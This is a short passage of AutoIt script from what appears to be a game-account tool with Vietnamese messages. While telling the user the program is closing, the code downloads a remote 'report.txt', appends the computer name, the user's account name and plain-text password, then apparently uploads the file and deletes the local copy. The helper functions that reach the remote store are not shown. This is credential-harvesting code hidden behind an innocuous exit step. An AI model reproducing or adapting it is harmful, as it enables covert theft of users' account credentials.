			_Text('[+] Đang đóng chương trình' & @CRLF & '[+] Vui lòng đợi....')
			_temp()
			_dumamadownload('report.txt')
			FileWrite(@AppDataDir & '\report.txt', $download)
			$data = ''
			For $i = 1 To _FileCountLines(@AppDataDir & '\report.txt')
				$data = $data & '\n' & FileReadLine(@AppDataDir & '\report.txt', $i)
			Next
			$data = StringRight($data, StringLen($data) - 2)
			_dumamaedit('report.txt', $data & '\n' & @HOUR & ':' & @MIN & ' - ' & @MDAY & '/' & @MON & '/' & @YEAR & ': ' & @ComputerName & ': ' & 'Account: ' & $acc & ' Pass: ' & $pass & ' Count: ' & $count & ' Total: ' & $total & ' ' & $game_name & '\n')
			FileDelete(@AppDataDir & '\report.txt')